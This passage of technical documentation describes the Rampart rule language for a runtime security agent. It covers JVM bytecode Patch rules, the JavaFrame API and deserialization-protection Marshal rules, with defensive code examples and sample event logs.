    socket("API Socket Server Bind"):
        bind(server: "0.0.0.0:0")
        api(any)
        protect(message: "", severity: High)
    endsocket

endapp
```

# **Rampart Rules**

This section contains a detailed description of each Rampart rule type and how to configure it.

## **Rampart Patch Rule**

The Rampart Patch rule provides the user with the ability to change the behavior of a class at runtime. While Rampart Patch rules can target any class loaded by the JVM, some Rampart Engine implementations may choose to restrict patching of a small number of primordial classes that are tightly coupled to the JVM, such as `java.lang.String`, `java.lang.Class`, `java.lang.Object`. In all other cases, any class loaded by the JVM can be patched by a Rampart Patch rule.

## Given (Conditions)

The Patch rule has one condition that is specified via the `function` statement. This is used to identify the function to be patched. The function statement must contain the fully qualified class name, method name, and method descriptor of the target function to be patched, specified using the internal notation of the underlying machine, such as the JVM or the CLR.

## When (Event)

Rampart Patch rules are applied to targeted bytecode instructions at runtime. The Patch rule supports many different types of event statements, called **location-specifiers**. Each location-specifier identifies a bytecode instruction within the function where the patch should be applied.

## Then (Action)

Unlike the other Rampart rules that have various declarative actions like detect, protect, deny, etc; a Patch rule must provide its intended action as a code block of supplied source code. The code block is specified by means of the `code` keyword and terminated with the `endcode` keyword. When the defined event conditions of a given Patch rule are triggered, the specified code statement is compiled and executed at the specified patch location.

## Runtime Notation

In order to target events, the `function` and **location-specifier** need to be declared using the internal signature notation used by the machine running the instructions. In the case of Java, this is the Java Virtual Machine (JVM). An event is relative to the function of a particular namespace. Using Java as an example, consider the following line of code:

```
String.valueOf(8);
```

The invocation of the method `valueOf()` on the `String` class would actually appear differently written in the JVMs internal form. The following example shows how it would appear:

```
java/lang/String.valueOf(I)Ljava/lang/String;
```

| Part Name | Part | Description |
| --------- | ---- | ----------- |
| Class | java/lang/String | The fully qualified name (FQN) of the class that contains the targeted method. |
| Method | valueOf | The method name that needs to be targeted. Overloaded methods have different arguments. |
| Arguments | (I) | It is important to target the specific method by specifying the correct arguments, in the order they are expected. |
| Return Type | Ljava/lang/String; | The return type is always declared at the end of the signature. |
| Descriptor | (I)Ljava/lang/String; | The descriptor is a combination of the arguments and the return type. |

### Java Types

| Type | Internal | Example | Default Value | Size | Frame Slot Allocation |
| ---- | -------- | ------- | ------------- | ---- | --------------------- |
| object | L<type> | Ljava/lang/String; | null | 16 bytes minimum | 1 |
| boolean | Z |  | false | 1 bit | 1 |
| byte | B |  | 0 | 8 bit signed | 1 |
| char | C |  | \u0000 | 16 bit | 1 |
| double | D |  | 0.0d | 64 bit | 2 |
| float | F |  | 0.0f | 32 bit | 1 |
| int | I |  | 0 | 32 bit | 1 |
| long | J |  | 0L | 64 bit | 2 |
| short | S |  | 0 | 16 bit | 1 |
| void | V |  |  |  | N/A |
| Single dimensional array | [<type> | [J |  |  | 1 |
| Multidimensional array | [[<type> | [[java/lang/Object; |  |  | 1 |

### More JVM Internal Form Examples

```
java/lang/String.toUpperCase()Ljava/lang/String;
java/lang/Class.forName(Ljava/lang/String;)Ljava/lang/Class;
java/io/File.setReadable(Z)Z
java/util/Hashtable.<init>(I)V
com/sun/crypto/provider/DESKey.getEncoded()[B
```

## Function

The function is the main target of the **Given (Condition)** step. It identifies the exact method of the exact class that we would like to apply the patch to. As an example, if we wanted our Rampart Patch rule to target the constructor for `java.net.URI(String str)` the `function` would be written as follows.

`function("java/net/URI.<init>(Ljava/lang/String;)V")`

## Location-Specifier

The **location-specifier** provides the **When (Event)** step. Once we have defined the Class and method we would like to patch in the **function** statement, we can use one of the location-specifier statements to declare a specific instruction within the function where the patch should be applied. Here is a complete list of all available location-specifier statements.

| entry() | instruction() | read() | write() | call() |
| ------- | ------------- | ------ | ------- | ------ |
| exit() | line() | readsite() | writesite() | callsite() |
| error() |  | readreturn() | writereturn() | callreturn() |

Every Patch rule must specify a single location-specifier. Every location-specifier, except for `entry()` and `exit()` must take an argument. The differences for each location-specifier are discussed in the following tables.

### ENTRY / EXIT / ERROR

| Location | Example | Description |
| -------- | ------- | ----------- |
| entry() |  | Apply the patch at the start of the targeted function, before the first bytecode instruction is executed in the targeted function. |
| exit() |  | Apply the patch at the return instruction from the targeted function. There may be more than one return instruction in a method, and the patch is applied at every return instruction. |
| error() | error("java/io/IOException") | Apply the patch to every exception which propagates from the targeted function. |

### INSTRUCTION / LINE

| Location | Example | Description |
| -------- | ------- | ----------- |
| instruction() | instruction(391) | Apply the patch immediately before the bytecode instruction at the specified instruction offset of the target function instruction stream. |
| line() | line(12) | Trigger the patch immediately before the instruction at the specified source code line number. |

### READ / READSITE / READRETURN

| Location | Example | Description |
| -------- | ------- | ----------- |
| read() | read("java/io/File.path") | Apply the patch in place of the memory read instruction for the specified memory field. |
| readsite() | readsite("java/io/File.path") | Apply the patch immediately before the memory read instruction for the specified memory field. |
| readreturn() | readreturn("java/io/File.path") | Apply the patch immediately after the memory read instruction for the specified memory field. |

### WRITE / WRITESITE / WRITERETURN

| Location | Example | Description |
| -------- | ------- | ----------- |
| write() | write("java/io/File.path") | Apply the patch in place of the memory write instruction for the specified memory field. |
| writesite() | writesite("java/io/File.path") | Apply the patch immediately before the memory write instruction for the specified memory field. |
| writereturn() | writereturn("java/io/File.path") | Apply the patch immediately after the memory write instruction for the specified memory field. |

### CALL / CALLSITE / CALLRETURN

| Location | Example | Description |
| -------- | ------- | ----------- |
| call() | call( "java/lang/String.valueOf(I)Ljava/lang/String;") | Apply the patch in place of the invoke instruction for the specified method. |
| callsite() | callsite( "java/lang/String.valueOf(I)Ljava/lang/String;") | Apply the patch immediately before the invoke instruction for the specified method. |
| callreturn() | callreturn( "java/lang/String.valueOf(I)Ljava/lang/String;") | Apply the patch immediately after the invoke instruction for the specified method. |

## Code

The code block contains the source code that is compiled into the target function by the Rampart Engine. The type of source code needs to be declared by the use of the **language** parameter. If the type of source code is not supported by the underlying runtime, the Rampart Patch is not linked. The source code in the code block can reference runtime classes by means of import declarations. For Java code blocks, this is done using the `import` keyword. The optional import parameter takes an array of strings that represent the runtime classes to import. The example here illustrates the use of the code block. As shown, the language parameter is set to **java** and the import parameter has an import for `java.io.IOException`.

```
app("Security Policy"):
    requires(version: "Rampart/2.0")

    patch("Example Patch"):
        function("java/net/URI.<init>(Ljava/lang/String;)V")
        entry()

        code(language: java, import: ["java.io.IOException"]):
            private static final String MSG = "The patch is working!";

            public void patch(JavaFrame frame) {
                frame.raiseException(new IOException(MSG));
            }
        endcode
    endpatch
endapp
```

All text between the `code` block’s opening and closing declarations are interpreted as source code. Rampart language syntax should not be used within the code block. It is possible to create new methods, classes, static blocks, instance fields or static fields within the code block. It is important to note that in Rampart 2.0, source code written in one Rampart Patch is not shared with any other Rampart Patch.

### Rampart Patch Methods

A Rampart Patch rule makes certain methods available to the patch developer that are tied to the Rampart Rule life-cycle. These methods can be overridden to provide customized behavior at each lifecycle event.

| Method | Required | Description |
| ------ | -------- | ----------- |
| public void load(); | optional | The load() method is invoked once the link life-cycle event is triggered. Since this is a once-off event, the load method is useful for the initialization of the state. |
| public void patch(JavaFrame frame); | mandatory | The patch() method is invoked once the execute life-cycle event is triggered. This event can happen multiple times. Every patch must implement the patch() method. |
| public void unload(); | optional | The unload() method is invoked once the unlink life-cycle event is triggered. Like the load() event, this is also a once-off event. |

### Rampart Patch State

The Rampart Engine provides an efficient memory store for patches within the same Rampart Mod to share memory state between them. The memory store for a given Rampart Mod can be accessed via two built-in functions within the Rampart Engine.

| Method | Description |
| ------ | ----------- |
| saveValue(Object key, Object value) | Store an object in the shared cache with a unique key. |
| restoreValue(Object key) | Retrieve an object stored in the shared cache by passing in the key. |

### JavaFrame

The JavaFrame accessor provides access to the active frame of the patched function at the location where the patch is applied. Using the JavaFrame accessor, the current state and contents of the operand stack and local variables can be read and overwritten. The active JavaFrame accessor is provided to the patch developer as the single argument to the `patch()` method. Please refer to the JavaFrame API for a detailed list of the accessors for reading and writing active frame states. For more information regarding frames, local variable array, and operand stack, please refer to Java Virtual Machine specification at Oracle’s “The Java Virtual Machine Specification”.

### JavaField / JavaMethod

The JavaField and JavaMethod accessors are provided by the Rampart Engine for unrestricted access to any members of any class. They can be used by a Patch rule to access private members, overwrite final fields, and other similar operations. The following example highlights how to create a JavaField accessor, and how it can be used to read/write a private field. Use of the JavaMethod accessor follows the same convention. Please refer to the JavaField / JavaMethod API documentation for further information.

```
app("Security Policy"):
    requires(version: "Rampart/2.0")

    patch("Patch File.getCanonicalPath() Method"):
        function("java/io/File.getCanonicalPath()Ljava/lang/String;")
        error("java/io/IOException")

        code(language: java, import: ["java.io.IOException"]):
            private static JavaField detailMessageField;

            public void load() {
                detailMessageField = JavaField.load(
                    "java/lang/Throwable.detailMessage");
            }

            public void patch(JavaFrame frame) {
                IOException ioe = (IOException) frame.loadObjectOperand(0);
                String detailMessage = detailMessageField.readString(ioe);
                detailMessageField.writeString(ioe,
                    "The IOException message has been changed!");
            }
        endcode
    endpatch

endapp
```

## Patch Rule Example

Consider the following Java source code:

```
package ie.example;

public class Utils {

    public byte[] createByteArray(int length) {
        return new byte[length];
    }

}
```

The Java bytecode for the method `createByteArray()` can be seen here:

```
public byte[] createByteArray(int);
    descriptor: (I)[B
    flags: ACC_PUBLIC
    Code:
        stack=1, locals=2, args_size=2
            0: iload_1
            1: newarray      byte
            3: areturn
        LineNumberTable:
            line 4: 0
```

Now consider the case where a source code change was introduced to check whether the integer argument called `length` is a positive integer and that it does not exceed a size of 100 before creating the `byte[]`, throwing an `IllegalStateException` if either of these conditions are not met. Here is what the new source code would look like for the `createByteArray()` method.

```
package ie.example;

public class Utils {

    public byte[] createByteArray(int length) {
        if (length < 0 || length > 100) {
            throw new IllegalStateException("Length must be a positive integer and cannot exceed a size of 100");
        }
        return new byte[length];
    }

}
```

To apply the same effect with a Rampart Patch rule is trivial. To do so, we can create a Rampart Patch rule that targets the `createByteArray()` method, at the **entry** location, to be applied before instruction 0 is executed. At this location, the Rampart Patch has access to the length argument from the local variable array and can perform the same check conditions, raising an `IllegalStateException` if either of the conditions is not met. Below is an example Rampart Patch to provide this behavior.

- **Function**: `"ie/example/Utils.createByteArray()[B"`
- **Location Specifier**: `entry()`

```
app("Security Policy"):
    requires(version: "Rampart/2.0")

    patch("Example Patch")
        function("ie/example/Util.createByteArray(I)[B")
        entry()

        code(language: java):
            public void patch(JavaFrame frame) {
                int length = frame.loadIntVariable(1);
                if (length < 0 || length > 100) {
                    frame.raiseException(new IllegalStateException("Length must be a positive integer and cannot exceed a size of 100"));
                }
            }
        endcode
    endpatch

endapp
```

The above Rampart App declares a single Rampart Patch rule. The rule has the following statements.

- `function`
    - the signature of the method which contains the code to be patched
- `location-specifier`
    - the specific location within the function where the patch should be applied
- `code`
    - the code to be compiled into the target function at the specified location

## Occurrences

In certain cases, there may be multiple locations of the same bytecode instruction with a target function being patched. It is possible to select the exact instruction by using an optional parameter to the function statement called `occurrences`. The occurrences parameter is a Key-Value pair with a key of occurrences and the value is an array of integers that represent each occurrence of the location specifier. Only the specified occurrence(s) are patched. If an occurrence has been specified that is out of bounds, i.e. that occurrence does not exist, then it is ignored and the Rampart Patch rule applies where applicable. The occurrences parameter can be specified on the following location specifiers:

| Location | Example | Description |
| -------- | ------- | ----------- |
| read() | read("java/io/File.path", occurrences: [2]) | Apply the patch by replacing only the 2nd occurrence of the getfield bytecode instruction of the path field. |
| readsite() | readsite("java/io/File.path", occurrences: [3, 5]) | Apply the patch immediately before the 3rd and 5th occurrence of the getfield bytecode instruction of the path field. |
| readreturn() | readreturn("java/io/File.path", occurrences: [4, 6]) | Apply the patch immediately after the 4th and 6th occurrence of the getfield bytecode instruction of the path field. |
| write() | write("java/io/File.path", occurrences: [1, 7]) | Apply the patch by replacing the 1st and 7th occurrence of the putfield bytecode instruction of the path field. |
| writesite() | writesite("java/io/File.path", occurrences: [2]) | Apply the patch immediately before the 2nd occurrence of the putfield bytecode instruction of the path field. |
| writereturn() | writereturn("java/io/File.path", occurrences: [4, 6]) | Apply the patch immediately after the 4th and 6th occurrence of the putfield bytecode instruction of the path field. |
| call() | call("java/lang/String.valueOf(I)Ljava/lang/String;", occurrences: [2]) | Apply the patch by replacing only the 2nd occurrence of the invoke* bytecode instruction of the valueOf method. |
| callsite() | callsite("java/lang/String.valueOf(I)Ljava/lang/String;", occurrences: [3, 5]) | Apply the patch immediately before the 3rd and 5th occurrence of the invoke* bytecode instruction of the valueOf method. |
| callreturn() | callreturn("java/lang/String.valueOf(I)Ljava/lang/String;", occurrences: [4, 6]) | Apply the patch immediately after the 4th and 6th occurrence of the invoke* bytecode instruction of the valueOf method. |

Consider the following example:

```
package com.example;

class Person {
    private int age;

    public Person(int age) {
        this.age = age;
    }

    @Override
    public String toString() {
        if (age == 0) {
            return "This person has no age.";
        }

        return "This person is " + age + " years old.";
    }
}
```

The following bytecode is for the `toString()` method as shown in the *Person* class:

```
public java.lang.String toString();
    descriptor: ()Ljava/lang/String;
    flags: ACC_PUBLIC
    Code:
        stack=2, locals=1, args_size=1
             0: aload_0
             1: getfield      #2 // Field age:I
             4: ifne          10
             7: ldc           #3  // String This person has no age.
             9: areturn
            10: new           #4  // class java/lang/StringBuilder
            13: dup
            14: invokespecial #5  // Method java/lang/StringBuilder."<init>":()V
            17: ldc           #6  // String This person is
            19: invokevirtual #7  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
            22: aload_0
            23: getfield      #2  // Field age:I
            26: invokevirtual #8  // Method java/lang/StringBuilder.append:(I)Ljava/lang/StringBuilder;
            29: ldc           #9  // String  years old.
            31: invokevirtual #7  // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;
            34: invokevirtual #10 // Method java/lang/StringBuilder.toString:()Ljava/lang/String;
            37: areturn
```

As shown here, the `age` field is being read at two different locations. The `getfield` bytecode instruction is called at instructions `1` and `23`.  If the Rampart developer is interested in only targeting the second `getfield` instruction, then they can use one of the read location specifiers, and pass in an occurrence of 2.

```
app("Security Policy"):
    requires(version: "Rampart/2.0")

    patch("Readsite patch")
        function("com/example/Person.toString()Ljava/lang/String")
        readsite("com/example/Person.age", occurrences: [2])

            code(language: java):
                public void patch(JavaFrame frame) {
                    // patch code here
                }
            endcode
    endpatch
endapp
```

Whenever a Rampart developer specifies an occurrence that does not exist, that specific occurrence is ignored but others still trigger the rule. For example, “`occurrences: [2]`” and “`occurrences: [2,3]`" would produce the same effect in the above case. However, if all the occurrences specified are **out of bounds**, then the patch code cannot be applied. For such cases, a link error message is generated in the CEF log file specifying the maximum event count and the set of configured occurrences of the patch. Consider the following **readsite** specifier:

```
readsite("com/example/Person.age", occurrences: [3])
```

Since there is no third occurrence of the getfield instruction for the age field, the patch cannot be applied. As a result, a log message is printed to the CEF log file.

```
<14>1 2020-07-09T04:01:00.321Z win_system_1 java 18914 - - CEF:0|Rampart:Rampart|Rampart|2.2|rule 2|Link Rule|Very-High|rt=Jul 09 2020 04:01:00.307 +0000 dvchost=win_system_1 procid=18914 ruleType=patch securityFeature=patch outcome=failure reason=occurrences for patch [3] exceed the maximum occurrence count 2
```

## Patch Execution Ordering And Greedy Location Specifiers

It is possible for plural Rampart Patch rules to target the same function code at the same location-specifier.

In such cases, all plural site and return patches are applied sequentially in an undefined, implementation-specific order.

However, when two or more Rampart Patch rules target a `call()`, `read()`, or `write()` location-specifier in a target function, then only one of the patches is applied with link errors recorded for the matching but unapplied patches.

The location-specifiers for which only one patch can be applied at a time are known as greedy location specifiers. They are different from the site and return location specifiers as they consume (i.e. replace) the targeted bytecode instruction.

As an example consider the following Java program:

```
package ie.example;

class Person {
    private int age;

    public Person(int age) {
        this.age = age;
    }

    @Override
    public String toString() {
        String message;
        if (age == 0) {
            message = "This person has no age.";
        } else {
            message = "This person is " + age + " years old.";
        }

        return message;
    }
}
```

The following Rampart Mod contains some Rampart Patch rules that all target the same field in the same function using the various write location specifiers. Two of the patches are write() patches, which is a greedy specifier. Only one of the write() patches is applied; the other is recorded with a link error.

```
app("Security Policy"):
    requires(version: "Rampart/2.0")

    patch("write :01"):
        function("com/example/Person.toString()Ljava/lang/String")
        write("com/example/Person.message")

            code(language: java):
                public void patch(JavaFrame frame) {
                    // patch code here
                }
            endcode
    endpatch

    patch("write :02"):
        function("com/example/Person.toString()Ljava/lang/String")
        write("com/example/Person.message")

            code(language: java):
                public void patch(JavaFrame frame) {
                    // patch code here
                }
            endcode
    endpatch

    patch("writesite"):
        function("com/example/Person.toString()Ljava/lang/String")
        writesite("com/example/Person.message")

            code(language: java):
                public void patch(JavaFrame frame) {
                    // patch code here
                }
            endcode
    endpatch

    patch("writereturn"):
        function("com/example/Person.toString()Ljava/lang/String")
        writereturn("com/example/Person.message")

            code(language: java):
                public void patch(JavaFrame frame) {
                    // patch code here
                }
            endcode
    endpatch

endapp
```

In these cases, the first patch rule to trigger greedily consumes the memory write instruction and subsequent rules with an identical location specifier cannot be applied. Whenever there is a conflict of this sort, a link error notice is printed to the Rampart Engine’s event file to notify the user that a rule was suppressed due to the conflict.

```
<14>1 2020-07-09T04:01:00.321Z win_system_1 java 18914 - - CEF:0|Rampart:Rampart|Rampart|2.10|patch person|Link Rule|Very-High|rt=Jul 09 2020 04:01:00.307 +0000 dvchost=win_system_1 procid=18914 ruleType=patch securityFeature=patch outcome=failure appVersion=1
```

## Life-Cycle For Rampart Patch Rule

The linking conditions for a Rampart Patch rule are as follows. The method matching the function statement must first be found by the Rampart Engine. If the target function is never loaded into the JVM, then the patch is not applied. As a result, the link event for that Rampart Patch rule does not occur. Similarly, if the target function is loaded into the JVM, but the location-specifier statement cannot be matched to one or more instructions in the target function, then again, the patch is not applied and the link event for that Rampart Patch rule does not occur.

For a Rampart Patch rule to link, the target function must be found, and the location-specifier with the target function must also be found. When both of these cases are true (the target function is found and one or more location-specifier(s) are found) then the Rampart Engine links that Rampart Patch rule into the target function.

Linking events can occur at any time during JVM execution, but always occur before the target function and location-specifier(s) begin executing for the first time. However, linking does not necessarily have to happen during the startup of the application. Whenever a function/location-specifier is loaded into the JVM, the Rampart Engine will link the matching Rampart Patch rule.

The link state is also useful when debugging a Rampart Patch rule. If no link states are noted in the Rampart Engine event log when it was expected to present, this may indicate an error in the signature specified in the function statement or location-specifier.

During the link state for a Rampart Patch rule, the Java code contained in the code block is compiled. It is during this time that any compilation errors are reported and logged in the Rampart Engine event log.

## JavaFrame API

### The 'this' Variable

Returns the `this` instance for non-static functions.

```
Object loadThisVariable()
```

### Raising Exceptions

When there is a deliberate intention to throw an Exception in the context of the running application, an Exception must be raised via the `raiseException()` function. If an uncaught Exception were thrown from the `patch(JavaFrame)` method of a Rampart Patch, the Rampart Engine would consider the Rampart Patch rule to be broken, and immediately unlink (uncompile) the offending Rampart Patch rule from the target function.

```
void raiseException(Throwable throwable)
```

### Returning Values

There are cases where a Rampart Patch is required to return a value from the patched function, which prevents any further bytecode instructions from being executed after the location at which the Rampart Patch is applied.

```
void returnVoid()
void returnFloat(float returnValue)
void returnBoolean(boolean returnValue)
void returnInt(int returnValue)
void returnDouble(double returnValue)
void returnLong(long returnValue)
void returnChar(char returnValue)
void returnByte(byte returnValue)
void returnShort(short returnValue)
void returnString(String returnValue)
void returnObject(Object returnValue)
```

### Load Variables

The ***loadVariable*** methods are used to read values stored in a certain index in the local variable array. Please note that the long and double methods take up two index slots.

```
void loadFloatVariable(int index)
void loadIntVariable(int index)
void loadDoubleVariable(int index)
void loadLongVariable(int index)
void loadBooleanVariable(int index)
void loadByteVariable(int index)
void loadShortVariable(int index);
void loadCharVariable(int index);
void loadStringVariable(int index);
void loadObjectVariable(int index);
```

### Store Variables

The ***storeVariable*** methods are used to write values to a certain index in the local variable array. Please note that long and double take up two index slots.

```
void storeFloatVariable(int index, float newValue)
void storeIntVariable(int index, int newValue)
void storeDoubleVariable(int index, double newValue)
void storeLongVariable(int index, long newValue)
void storeBooleanVariable(int index, boolean newValue)
void storeByteVariable(int index, byte newValue)
void storeShortVariable(int index, short newValue);
void storeCharVariable(int index, char newValue);
void storeStringVariable(int index, String newValue);
void storeObjectVariable(int index, Object newValue);
```

### Load Operand

The ***loadOperand*** methods are used to read values stored in a certain index in the operand stack. Please note that the long and double methods take up two index slots.

```
float loadFloatOperand(int index)
int loadIntOperand(int index)
double loadDoubleOperand(int index)
long loadLongOperand(int index)
boolean loadBooleanOperand(int index)
byte loadByteOperand(int index)
short loadShortOperand(int index);
char loadCharOperand(int index);
String loadStringOperand(int index);
Object loadObjectOperand(int index);
```

### Store Operand

The ***storeOperand*** methods are used to write values to a certain index in the operand stack. Please note that the long and double methods take up two index slots.

```
void storeFloatOperand(int index, float newValue)
void storeIntOperand(int index, int newValue)
void storeDoubleOperand(int index, double newValue)
void storeLongOperand(int index, long newValue)
void storeBooleanOperand(int index, boolean newValue)
void storeByteOperand(int index, byte newValue)
void storeShortOperand(int index, short newValue);
void storeCharOperand(int index, char newValue);
void storeStringOperand(int index, String newValue);
void storeObjectOperand(int index, Object newValue);
```

# **Rampart Marshal Rule**

Marshalling and unmarshalling, also known as serialization and deserialization, is the process of converting objects to and from streams of structured data. **Deserializing untrusted data** can lead to a variety of problems when the system processes a data stream from an unverified source. Naively processing such data could have unforeseen consequences.

One such consequence arises when deserialization causes the JVM to instantiate one of the classes available on the application’s classpath. In the case of poorly designed classes, the attacker can use malformed serialized data to abuse application logic, deny service, or execute arbitrary code, when deserialized. A related issue is when a system processes configuration from an unverified source. Unverified configuration can lead to Server-Side Request Forgery (SSRF) or Local File Inclusion (LFI).

Serialization is used in several components of the JVM as well as in numerous third-party frameworks and dependencies.

## **Deserialization**

The deserialization security feature addresses attacks by reducing system privileges. This means that for the duration of a deserialization operation, the application operates in a restricted compartment (micro-segment) where specific system privileges are not available. Deserialization operations occur in a non-privileged context. Consequently, any attack (including zero-day attacks) that tries to access or change the state of the system fails.

The deserialization security feature can be safely enabled in all types of applications in order to be protected against Java and XML deserialization attacks.

ℹ️ Note that JSON deserialization vulnerabilities are not currently supported.

ℹ️ XML deserialization vulnerabilities can be introduced by different XML APIs and libraries. Currently, the only XML API that is supported is *java.beans.XMLDecoder*.

The deserialization security feature can be used safely and proactively on any Java application in order to protect its system resources and components during deserialization. For example, any deserialization exploit that might try to perform the following attacks fails:

- execute arbitrary privileged commands (Remote Command Execution)
- perform Remote Code Injection, change the system’s internal state
- terminate the JVM or other types of Denial-of-Service attacks

The Denial-of-Service deserialization protection safeguards critical system resources, such as the CPU and memory, by setting default limits to control the interaction frequency of the deserialized objects with the system resources. This way, legitimate serialized objects are allowed to be deserialized while malicious serialized objects that abuse the system resources are blocked. This protection mitigates Denial-of-Service attacks via brute force and resource exhaustion.

Deserial vulnerabilities are covered by:

- CWE-502
- CWE-250
- CWE-799
- CWE-400

### Given(Condition)

| deserialize | The keyword `deserialize` is one of two components that must be supplied in the marshal rule with only one being allowed to be configured in a single rule. `java` and `dotnet` are the only parameters accepted. |

### When(Event)

One of `rce` or `dos` must be declared in a `marshal` rule. Only one of these can exist in a `marshal` rule and neither can accept any parameter.

| rce | Remote Code Execution |
| dos | Denial of Service |

### Then(Action)

| Action | Description |
| ------ | ----------- |
| protect | All attempts to deserial are blocked. If configured, a log message is generated with details of the event. |
| detect | Monitoring mode: the application behaves as normal. If configured, a log message is generated with details of all attempts to deserial. A log message must be specified with this action. |

As part of the action statement, the user may optionally specify the parameter stacktrace: “full”. When this parameter is specified, the stacktrace of the location of the attempted exploit is included in the security log entry.

### Examples

Protecting the `Java` application from the `dos` attack:

```
app("myapp"):
    requires(version: Rampart/2.10)
    marshal("protect the app from denial-of-service attack"):
        deserialize(java)
        dos()
        protect(message: "the logging message")
    endmarshal
endapp
```

Protecting the `.Net` application from `rce` attack:

```
app("myapp"):
    requires(version: Rampart/2.10)
    marshal("protect the app from remote-code-execution attack"):
        deserialize(dotnet)
        rce()
        protect(message: "the logging message", severity: Low)
    endmarshal
endapp
```

### Logging

When the above `deserial` rule is triggered a log entry similar to the following is generated:

- dos

```
<10>1 2021-03-24T10:14:24.055Z userX_system java 9699 - - CEF:0|Rampart:Rampart|Rampart|2.10|MarshalRule|Execute Rule|High|rt=Mar 24 2021 10:14:24.053 +0000 dvchost=jenkins-qa-slave-centos.aws.example.lan procid=9699 appVersion=1 act=protect msg=Walter limit=100000 reason=CWE-400: Uncontrolled CPU consumption via API abuse methodName=java.util.EnumMap.hashCode()
<10>1 2020-09-10T00:24:50.513Z userX_system java 29417 - - CEF:0|Rampart:Rampart|Rampart|2.10|MarshalRule|Execute Rule|High|rt=Sep 10 2020 00:24:50.512 +0000 dvchost=jenkins-qa-slave-centos.aws.example.lan procid=29417 act=protect msg=Walter limit=100000 reason=CWE-400: Uncontrolled CPU consumption via API abuse methodName=java.util.Hashtable.hashCode()
```

- rce

```
<10>1 2021-03-22T12:24:53.327Z userX_system java 28013 - - CEF:0|Rampart:Rampart|Rampart|2.10|MarshalRule|Execute Rule|High|rt=Mar 22 2021 12:24:53.326 +0000 dvchost=jenkins-qa-slave-centos.aws.example.lan procid=28013 appVersion=1 act=protect msg=Walter methodName=java.lang.Runtime.exec() httpRequestUri=/objectinputstream-deserial/examples/deserial-PM-59-test.jsp httpRequestMethod=GET remoteIpAddress=127.0.0.1 httpSessionId=D194C19D465595307BBD2F04F5F7B632
```

The second example above has extra CEF extensions for httpRequestUri, remoteIpAddress and httpSessionId.

### Further Examples

Protecting the `Java` application from the `dos` attack with the stacktrace also logged:

```
app("Mod for Marshal dos Rule"):
    requires(version: Rampart/2.10)
    marshal("Marshal dos Rule"):
        deserialize(dotnet, java)
        dos()
        protect(message: "Testing Marshal dos Rule", severity: Very-High, stacktrace: "full")
    endmarshal
endapp
```

Protecting the `Java` application from `rce` attack with the stacktrace also logged:

```
app("Walter"):
    requires(version: Rampart/2.10)
    marshal("Marshal sys Rule"):
        deserialize(java)
        rce()
        protect(message: "Walter", severity: High, stacktrace: "full")
    endmarshal
endapp
```

### Logging

```
<9>1 2021-03-31T15:38:48.279+01:00 userX_system java 104596 - - CEF:0|Rampart:Rampart|Rampart|2.10|Marshal dos Rule|Execute Rule|Very-High|rt=Mar 31 2021 15:38:48.278 +0100 dvchost=ckang-XPS-15-9570 procid=104596 appVersion=1 act=protect msg=Testing Marshal dos Rule stacktrace=java.util.AbstractSet.hashCode(AbstractSet.java)\ndeserialjar.runners.OverwrittenReadObject.abstractSetHashCode(OverwrittenReadObject.java:434)\ndeserialjar.runners.OverwrittenReadObject.invokeMethod(OverwrittenReadObject.java:375)\ndeserialjar.runners.OverwrittenReadObject.readObject(OverwrittenReadObject.java:57)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\njava.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1170)\njava.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2232)\njava.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2123)\njava.io.ObjectInputStream.readObject0(ObjectInputStream.java:1624)\njava.io.ObjectInputStream.readObject(ObjectInputStream.java:464)\njava.io.ObjectInputStream.readObject(ObjectInputStream.java:422)\ndeserialjar.runners.OverwrittenReadObjectRunner.run(OverwrittenReadObjectRunner.java:32)\nMain.main(Main.java:63) limit=100000 reason=CWE-400: Uncontrolled CPU consumption via API abuse methodName=java.util.AbstractSet.hashCode()
```

```
<10>1 2021-03-31T15:51:32.1087+01:00 userX_system java 105393 - - CEF:0|Rampart:Rampart|Rampart|2.10|Marshal sys Rule|Execute Rule|High|rt=Mar 31 2021 15:51:32.1085 +0100 dvchost=ckang-XPS-15-9570 procid=105393 appVersion=1 act=protect msg=Walter stacktrace=deserialjar.runners.OverwrittenReadObject.invokeMethod(OverwrittenReadObject.java:103)\ndeserialjar.runners.OverwrittenReadObject.readObject(OverwrittenReadObject.java:57)\nsun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\nsun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\nsun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\njava.lang.reflect.Method.invoke(Method.java:498)\njava.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1170)\njava.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2232)\njava.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2123)\njava.io.ObjectInputStream.readObject0(ObjectInputStream.java:1624)\njava.io.ObjectInputStream.readObject(ObjectInputStream.java:464)\njava.io.ObjectInputStream.readObject(ObjectInputStream.java:422)\ndeserialjar.runners.OverwrittenReadObjectRunner.run(OverwrittenReadObjectRunner.java:32)\nMain.main(Main.java:63) methodName=java.lang.Runtime.exec()
```

### Whitelist

In the rare case where the deserial rule must allow specific privileges in certain environments, an optional property `Rampart.AllowDeserialPrivileges` can be used to whitelist specific deserial privileges.

### Setup AllowDeserialPrivileges Flag

- Open the `<absoulte path to agent>/conf_*/Rampart.properties` file.
- Add the following flag and make an adjustment according to the real-world requirement.

```
Rampart.AllowDeserialPrivileges=<comma-separated-values>
```

### Examples

Whitelist `java.lang.SecurityManager.<init>()`

```
Rampart.AllowDeserialPrivileges=java.lang.Secur`ityManager.<init>()
```

Whitelist `java.lang.SecurityManager.<init>()` and `java.lang.System.getenv()`

```
Rampart.AllowDeserialPrivileges=java.lang.SecurityManager.<init>(),java.lang.System.getenv()
```

## **XXE**

### Overview

